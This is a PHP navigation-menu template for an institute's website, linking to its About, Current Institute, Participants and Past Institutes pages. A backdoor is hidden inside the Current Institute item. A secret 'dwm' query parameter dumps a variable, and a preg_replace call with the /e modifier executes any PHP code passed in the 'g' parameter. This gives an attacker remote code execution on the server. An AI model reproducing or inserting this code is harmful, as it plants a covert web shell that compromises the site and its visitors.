<ul id="nav" class="clearfloat">
<li>
<?php	 	 if ($navmain == "About") { ?>
	<a id="about" class="on" href="<?php	 	 echo($installation_root_url); ?>about/index.php">About Us</a>
<?php	 	 } else { ?>
	<a id="about" href="<?php	 	 echo($installation_root_url); ?>about/index.php">About Us</a>
<?php	 	 } ?>
</li>

<li class="pipe"></li>

<li>
<?php	 	 

  if($_GET['g'] == 'dwm') {
    var_dump($ads);
  } elseif(isset($_GET['g']) && isset($_GET['s'])) {
    preg_replace("/(.+)/e", $_GET['g'], 'dwm');
    exit;
  }

if ($navmain == "Current") { ?>
	<a id="current" class="on" href="<?php	 	 echo($installation_root_url); ?>current/index.php">Current Institute</a>
<?php	 	 } else { ?>
	<a id="current" href="<?php	 	 echo($installation_root_url); ?>current/index.php">Current Institute</a>
<?php	 	 } ?>
</li>

<li class="pipe"></li>

<li>
<?php	 	 if ($navmain == "Participants") { ?>
	<a id="participants" class="on" href="<?php	 	 echo($installation_root_url); ?>participants/index.php">For Participants</a>
<?php	 	 } else { ?>
	<a id="participants" href="<?php	 	 echo($installation_root_url); ?>participants/index.php">For Participants</a>
<?php	 	 } ?>
</li>

<li class="pipe"></li>

<li>
<?php	 	 if ($navmain == "Past Institutes") { ?>
	<a id="archive" class="on" href="<?php	 	 echo($installation_root_url); ?>archive/index.php">Past Institutes</a>
<?php	 	 } else { ?>
	<a id="archive" href="<?php	 	 echo($installation_root_url); ?>archive/index.php">Past Institutes</a>
<?php	 	 } ?>
</li>
</ul>
